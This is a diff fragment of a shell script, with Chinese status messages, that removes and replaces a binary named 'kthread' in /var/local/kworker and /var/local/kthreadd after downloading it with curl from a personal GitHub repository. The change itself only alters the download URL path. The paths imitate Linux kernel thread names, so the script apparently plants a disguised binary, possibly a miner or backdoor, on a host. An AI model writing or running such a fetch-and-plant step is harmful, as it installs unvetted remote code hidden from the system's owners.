@@ -8,7 +8,7 @@ rm -f /var/local/kworker/kthread
 rm -f /var/local/kthreadd/kthread
 
 echo "[+] 正在下载最新的 kthread 文件..."
-curl -fsSL "https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/kthread" -o kthread
+curl -fsSL "https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/kthread/kthread" -o kthread
 
 echo "[+] 正在复制文件到目标目录..."
 cp -f "/var/local/kworker/kthread" "/var/local/kthreadd/kthread"
